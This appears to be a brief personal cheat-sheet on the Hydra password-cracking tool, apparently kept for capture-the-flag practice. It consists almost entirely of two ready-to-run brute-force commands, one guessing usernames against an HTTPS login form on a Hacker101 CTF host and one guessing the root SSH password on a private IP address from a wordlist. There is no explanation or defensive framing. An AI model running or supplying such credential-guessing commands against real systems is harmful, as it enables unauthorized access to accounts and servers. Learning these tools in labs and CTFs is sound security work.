# Hydra

<https://github.com/gnebbia/hydra_notes>

## https

```
 hydra -L ~/SecLists/Usernames/cirt-default-usernames.txt -p 123123123 658b5b7a42133cc3a26d84c6e6df486e.ctf.hacker101.com https-form-post "/login:username=^USER^&password=^PASS^:Invalid username"
```

## ssh

```
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.20.33:22 -t 4 -V
```
